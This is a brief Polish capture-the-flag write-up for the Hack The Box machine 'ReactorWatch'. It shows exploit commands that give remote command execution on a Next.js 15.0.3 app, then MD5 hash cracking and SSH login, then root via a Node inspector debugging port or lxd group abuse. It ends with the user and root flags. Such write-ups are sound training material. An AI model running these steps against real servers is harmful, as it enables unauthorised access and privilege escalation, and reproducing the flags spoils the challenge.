# ReactorWatch — Hack The Box (Write-up)

**Maszyna:** Linux · porty 22, 3000  
**Stack:** Next.js 15.0.3, SQLite, systemd uptime-monitor

> Tylko HTB / lab. Flagi na końcu.

## TL;DR

| Faza | Wektor |
|------|--------|
| Recon | :3000 Next.js, brak REST tokenów |
| Foothold | React2Shell POST / (freeqaz/react2shell) |
| User | reactor.db MD5 engineer → SSH |
| Root | node --inspect root + CDP (cicho) |
| Alt root | grupa lxd + snap (głośno) |

## React2Shell

git clone https://github.com/freeqaz/react2shell.git
./detect.sh http://IP:3000/
./exploit-redirect.sh http://IP:3000/ 'id'

## User

sqlite3 users → MD5 → crack → ssh engineer@IP

## Root (inspect)

python3 scripts/root-inspect-cdp.py

## Flagi

USER: eeecdf5fc51c62ef6d56b620eab3debf
ROOT: 5ec83d029828273606a56a366acec524
